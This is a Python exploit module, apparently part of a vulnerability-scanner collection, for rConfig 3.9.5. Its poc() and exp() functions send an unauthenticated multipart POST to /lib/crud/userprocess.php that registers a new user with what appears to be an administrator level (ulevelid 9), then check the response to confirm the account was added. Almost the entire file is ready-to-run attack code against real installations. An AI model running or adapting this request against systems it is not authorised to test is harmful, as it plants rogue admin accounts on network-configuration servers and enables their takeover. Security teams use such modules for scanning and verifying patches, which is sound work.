import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''rConfig 3.9.5 - Remote Code Execution''',
        "description": '''A vulnerability in rConfig allows remote attackers to execute arbitrary code on the remote installation by accessing the 'userprocess.php' endpoint.''',
        "severity": "high",
        "references": [
            "https://www.rconfig.com/downloads/rconfig-3.9.5.zip", 
            "https://www.exploit-db.com/exploits/48878"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["rconfig", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/lib/crud/userprocess.php"""
        method = "POST"
        data = """--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="username"

{{randstr}}
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="passconf"

Testing1@
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="password"

Testing1@
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="email"

test@{{randstr}}.tld
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="editid"


--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="add"

add
--01b28e152ee044338224bf647275f8eb
Content-Disposition: form-data; name="ulevelid"

9
--01b28e152ee044338224bf647275f8eb--"""
        headers = {'Accept': '*/*', 'Content-Type': 'multipart/form-data; boundary=01b28e152ee044338224bf647275f8eb', 'Cookie': 'PHPSESSID={{randstr}}'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""User {{randstr}} successfully added to Database""" in resp0.text) and (resp0.status_code == 302):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url